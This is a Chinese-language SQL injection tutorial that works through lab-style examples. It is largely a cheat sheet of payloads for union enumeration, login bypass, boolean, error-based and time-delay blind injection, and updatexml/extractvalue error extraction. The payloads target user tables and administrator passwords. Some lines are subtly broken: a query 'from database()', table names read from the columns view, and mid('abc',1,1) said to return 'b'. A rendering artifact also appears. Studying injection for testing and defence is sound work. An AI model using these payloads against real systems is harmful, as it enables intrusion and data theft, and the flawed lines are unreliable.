  • SQL注入的根本：使得SQL语句闭合。

闭合中会讲到一堆绕过，详见SQL注入绕过姿势

爆破的三个对象，爆库，爆表，爆列

爆破库名

1' union select 1,2,database()

爆破表名

1' union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database()

1' union select 1,2,group_concat(table_name) from information_schema.columns where table_schema=database()

爆破column名

1' union select 1,2,group_concat(column_name) from information_schema.columns where table_schema=database()

知道columns名之后，爆破数据

1' union select 1,2,group_concat(column_name) from database()

1.检索隐藏数据

  • 修改SQL查询以返回其他结果

    举个例子：在某个购物品牌的页面，被展出的那些都是已发布的产品，而我们要做的就是通过攻击，从而获得那些为发布的产品的信息。

    例如

    考虑展示不同类别产品的购物应用程序。当用户单击礼品类别时，他们的浏览器请求URL：https://insecure-website.com/products?category=Gifts

  • 对category=Gifts进行绕过

  • 利用 category='Gifts' OR 1=1--' 因为1=1始终成立，所以查询将返回所有项目

2.颠覆应用逻辑

普通的查询

SELECT * FROM users WHERE username = '' AND password = ''

如果查询返回用户的详细信息，则登录成功。否则，它将被拒绝。

  • 攻击方式
SELECT * FROM users WHERE username = 'administrator'--' AND password = ''

3.SQL联合注入

  • 联合注入: 即union select

要执行SQL注入 union 攻击，需要确保union查询满足这一条件。

union查询条件

  • 单个查询必须返回相同数量的列。
  • 每个列中的数据类型必须在单个查询之间兼容。

要执行SQL联合注入 union 攻击，需要确保攻击符合这两个要求。

利用union注入要求

  • 字段数
  • 从原始查询返回的哪些列具有合适的数据类型、注入点

3.1确定SQL UNION注入所需的列数

  • 两种查询方法

Solution1

假设注注点是原始查询条款中的引用字

符串，使用payload：ORDER BY WHERE

' ORDER BY 1--
' ORDER BY 2--
' ORDER BY 3--
etc.

Solution2

及提交一系列payload，指定不同数量的空值：UNION SELECT

' UNION SELECT NULL--
' UNION SELECT NULL,NULL--
' UNION SELECT NULL,NULL,NULL--
etc.
  • 特别的：在Oracle中，需要改为
UNION SELECT NULL FROM DUAL--

如果union,select,or这些都被过滤的时候，尝试双写绕过

payload:

1’ununionion seselectlect 1#&password=1

3.2 在SQL UNION联合注入中查找具有有用数据类型的列

  • 在3.1操作后，通过提交一系列payload来检测每个列是否可以保留字符串数据
' UNION SELECT 'a',NULL,NULL,NULL--
' UNION SELECT NULL,'a',NULL,NULL--
' UNION SELECT NULL,NULL,'a',NULL-- 
' UNION SELECT NULL,NULL,NULL,'a'--         // 类似于此

如果列的数据类型与字符串数据不兼容，则注入的查询将导致报错

Conversion failed when converting the varchar value 'a' to data type int.
  • 联合查询中有个小技巧，在联合查询并不存在的数据时，联合查询就会构造一个 虚拟的数据。举个例子：最初users表中只有一行数据

我们通过union select查询就可以构造一行虚拟的数据

4. SQL注入盲注

  • 当应用程序易受SQL注射时，会出现SQL注入盲注。
  • 但其HTTP响应不包含相关SQL查询的结果或任何数据库错误的细节。

4.1 通过回显来利用盲目的SQL注射

检测是否存在SQL注入

  • 对于cookie以及其他注入点
…xyz' AND '1'='1
…xyz' AND '1'='2

  • 如果'1'='1与'1'='2的回显不同，则说明存在SQL注入

  • 重点：关注回显

使用的payload便是

xyz' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>1)='a           // 先判断密码长度


xyz' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) > 'm      // 使用Intruder进行爆破

当substr函数被ban的时候，我们可以考虑使用其他功能类似的函数

subtring-----> 功能一致

mid(‘abc’,1,1)——–>’b’
left(‘abc’,1,1)——–>’a’
:hexoPostRenderEscape–>

4.2 通过触发SQL错误来诱导有条件响应

  • 针对于cookie以及其他注入点
xyz' AND (SELECT CASE WHEN (1=2) THEN 1/0 ELSE 'a' END)='a
xyz' AND (SELECT CASE WHEN (1=1) THEN 1/0 ELSE 'a' END)='a
  • 使用第一个输入，表示将进行评估，这不会导致任何错误。使用第二个输入，它会评估，这会导致除以零的错误。
  • 评估根据不同的类型的数据库进行，详见SQL injection cheat sheet | Web Security Academy (portswigger.net)

那么使用的payload便是：

xyz' AND (SELECT CASE WHEN (1=1) THEN (1/0) ELSE '' END FROM users WHERE username='administrator') 'administrator           // 确认username
  • 核心！
  • 替换CASE WHEN 当中的条件，从而进行攻击

例如

xyz'AND (SELECT CASE WHEN LENGTH(password)>1 THEN (1/0) ELSE '' END FROM users WHERE username='administrator')'
xyz'||(SELECT CASE WHEN SUBSTR(password,1,1)='a' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'  // Oracle_payload

4.3 SQL注入盲注时间延迟

时间盲注的背景

注入SQL 代码之后， 存在以下两种情况：

  • 如果注入的SQL代码不影响后台[ 数据库] 的正常功能执行， 那么Web 应用的页面显示正确（ 原始页面） 。
  • 如果注入的SQL代码影响后台数据库的正常功能（ 产生了SQL 注入） ， 但是此时Web应用的页面依旧显示正常（ 原因是Web 应用程序采取了“ 重定向” 或“ 屏蔽 ”措施）。

产生一个疑问：注入的SQL代码到底被后台数据库执行了没有？ 即web应用程序是否存在SQL注入？
面对这种情况，之前讲的基于布尔的SQL盲注很难发挥作用了（ 因为基于布尔的SQL盲注的前提是web程序返回的页面存在true和false两种不同的页面）。这时，一般采用基于web应用响应时间上的差异来判断是否存在SQL注入， 即基于时间型SQL盲注。

延时注入又称时间盲注，也是盲注的一种。通过构造延时注入语句后，浏览器页面的响应时间来判断正确的数据

  • 针对于cookie以及其他注入点

直接在request 下

'; IF (1=2) WAITFOR DELAY '0:0:10'--      
'; IF (1=1) WAITFOR DELAY '0:0:10'--
  • 第二个(1=1)会触发10秒的延迟

4.4 SQL盲注 时间延迟和条件型信息检索

是4.2与4.3的结合体

使用的payload

'%3B SELECT CASE WHEN (1=1) THEN pg_sleep(10) ELSE pg_sleep(0) END--
'%3B SELECT CASE WHEN (1=2) THEN pg_sleep(10) ELSE pg_sleep(0) END--
    // %3B通过url转码，得到是;
    // 第一个成功延迟，第二个失败
  • 用来判断是否有用户被调用
'%3B SELECT CASE WHEN (username='administrator')   THEN pg_sleep(10) ELSE pg_sleep(0) END FROM users--administrator

5.SQL报错注入

  • 最常用的xpath报错注入——————updatexml()与extractvalue()

5.1 updatexml()函数进行SQL报错注入

updatexml()的作用：改变文档中符合条件的节点的值

  • 语法
updatexml（XML_document，XPath_string，new_value）

第一个参数：是string格式，为XML文档对象的名称，文中为Doc第二个参数：代表路径，Xpath格式的字符串例如//title【@lang】 第三个参数：string格式，替换查找到的符合条件的数据。

例如： select * from test where ide = 1 and (updatexml(1,0x7e,3)); 由于0x7e是~，不属于xpath语法格式，因此报出xpath语法错误。

  • 爆数据库
1' and updatexml(1,concat(0x7e,database()),1)#
  • 爆数据表
1' and updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x7e),1) #
  • 爆user表字段信息
1' and updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_schema='dvwa' and table_name=table_name),0x7e),1) #
  • 爆内容
1' and updatexml(1,concat(0x7e,(select group_concat(first_name,0x7e,column_name) from dvwa.users)),1) #

5.2 使用extractvalue()函数

作用：从目标XML中返回包含所查询值的字符串

  • 语法：extractvalue(XML_document，xpath_string)第一个参数：string格式，为XML文档对象的名称 第二个参数：xpath_string（xpath格式的字符串）
select * from test where id=1 and (extractvalue(1,concat(0x7e,(select user()),0x7e)));

使用extractvalue时若xpath_string格式出现错误，则会爆出xpath语法错误(xpath syntax)

select user,password from users where user_id=1 and (extractvalue(1,0x7e));

由于0x7e就是~不属于xpath语法格式，因此报出xpath语法错误。

例子：

爆数据库：

1' and extractvalue(1,concat(0x7e,user(),0x7e,database())) #

爆数据表：

1' and extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()))) #

字段：

1' and extractvalue(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name='table_name'))) #

爆数据：

1' and extractvalue(1,concat(0x7e,(select group_concat(user_id,0x7e,first_name,0x3a,last_name) from dvwa.users))) #
